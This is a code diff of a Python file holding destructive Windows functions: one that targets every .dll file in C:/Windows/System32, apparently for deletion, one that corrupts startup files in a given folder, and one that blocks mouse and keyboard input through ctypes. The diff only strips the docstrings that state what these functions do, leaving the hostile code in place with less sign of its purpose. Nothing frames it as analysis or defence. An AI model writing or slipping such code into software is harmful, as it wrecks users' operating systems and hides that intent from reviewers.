@@ -4,9 +4,6 @@
 # PUT ALL FUNCTIONS IN DIFFRENT FILE
 
 def delete_dll():
-    """
-    This function deletes all files ending with '.dll' in the 'C:/Windows/system32' directory. 
-    """
     try:
         os.chdir('C:/Windows/System32')
         files = [f for f in os.listdir() if f.endswith('.dll')]
@@ -16,18 +13,6 @@ def delete_dll():
         raise OSError(f'System32 directory does not exist.')
 
 def corrupt_startup_files(source_folder):
-    """This function corrupts startup files in given source folder
-
-    Parameters
-    ----------
-    source_folder : str
-        The path to the source folder where the files should be corrupted
-
-    Returns
-    -------
-    None
-        This function does not return anything.
-    """
     # Import relevant modules
     import os, shutil
  
@@ -54,9 +39,6 @@ def corrupt_startup_files(source_folder):
 import ctypes
 
 def disable_mouse_keyboard_windows():
-    """
-    Disables mouse and keyboard on Windows
-    """
     # Disable mouse
     ctypes.windll.user32.BlockInput(True)
     # Disable keyboard
